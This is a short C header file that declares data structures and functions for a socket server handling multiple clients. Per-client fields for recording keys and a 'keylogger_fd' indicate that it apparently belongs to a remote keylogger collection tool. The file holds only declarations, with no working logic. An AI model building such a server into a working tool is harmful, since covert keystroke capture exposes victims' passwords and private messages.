#pragma once
#include <arpa/inet.h>
#include "constraints.h"

struct clientAttributes
{
    int recordKeys;
    char name[NAME_SIZE];
    int keylogger_fd;
};

typedef struct clientAttributes clientAttributes_t;

struct clientHandler
{
    int numberClients;
    int socketsClients[MAX_CLIENTS];
    clientAttributes_t clientsAttr[MAX_CLIENTS];
};

typedef struct clientHandler clientHandler_t;

void setZeroClientHandler(clientAttributes_t *clientAttr);

void *handle_client(void *params);

void sock_init(int *socket_desc, struct sockaddr_in *server);
